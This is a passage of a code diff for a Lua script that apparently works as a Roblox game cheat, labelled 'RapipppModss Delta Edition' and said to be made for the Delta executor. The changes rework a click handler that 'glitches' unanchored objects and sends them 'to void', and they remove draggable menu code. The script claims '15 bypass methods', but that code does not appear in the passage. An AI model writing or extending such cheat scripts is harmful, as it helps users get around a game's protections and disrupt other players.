+                        updateUI()
+                        notify("👻 Glitched!", "Sent to void!", 2)
                     end
                 end
             end)
@@ -528,106 +451,29 @@ local function startContinuousEffect(obj, mode)
         end
     end)
     
-    updateStatus()
+    updateUI()
+    notify("✅ Applied!", mode:upper() .. " on " .. obj.Name, 2)
 end
 
--- Click handler
+-- Mouse click
 mouse.Button1Down:Connect(function()
-    if not isEnabled then return end
+    if not Settings.Enabled then return end
     
     local target = mouse.Target
+    if not target or not target:IsA("BasePart") then return end
     
-    if target and target:IsA("BasePart") then
-        local isPlayerPart = false
-        local ancestor = target
-        
-        while ancestor do
-            if ancestor:IsA("Model") and Players:GetPlayerFromCharacter(ancestor) then
-                isPlayerPart = true
-                break
-            end
-            ancestor = ancestor.Parent
+    local char = target
+    while char do
+        if char:IsA("Model") and Players:GetPlayerFromCharacter(char) then
+            return
         end
-        
-        if not isPlayerPart then
-            startContinuousEffect(target, currentMode)
-            
-            local status = activeEffects[target] and "STARTED" or "STOPPED"
-            if not target.Anchored then
-                showNotification("✅ UNANCHORED!", status .. " " .. currentMode:upper() .. " on " .. target.Name, 2)
-            end
-            print("[RapipppModss] " .. status .. " " .. currentMode .. " on: " .. target.Name)
-        end
+        char = char.Parent
     end
+    
+    applyEffect(target, Settings.Mode)
 end)
 
--- Draggable MainFrame
-local dragging, dragInput, dragStart, startPos
-
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-    end
-end)
-
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-
-MainFrame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- Draggable MinimizedLogo
-local dragLogoInput, dragLogoStart, logoStartPos
-local draggingLogo = false
-
-MinimizedLogo.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        draggingLogo = true
-        dragLogoStart = input.Position
-        logoStartPos = MinimizedLogo.Position
-    end
-end)
-
-MinimizedLogo.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragLogoInput = input
-    end
-end)
-
-MinimizedLogo.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        draggingLogo = false
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragLogoInput and draggingLogo then
-        local delta = input.Position - dragLogoStart
-        MinimizedLogo.Position = UDim2.new(
-            logoStartPos.X.Scale,
-            logoStartPos.X.Offset + delta.X,
-            logoStartPos.Y.Scale,
-            logoStartPos.Y.Offset + delta.Y
-        )
-    end
-end
+print("✅ RapipppModss Delta Edition loaded!")
+print("📱 Optimized for Delta Executor")
+print("🔧 15 bypass methods ready")
+print("💪 Click objects to apply effects!")
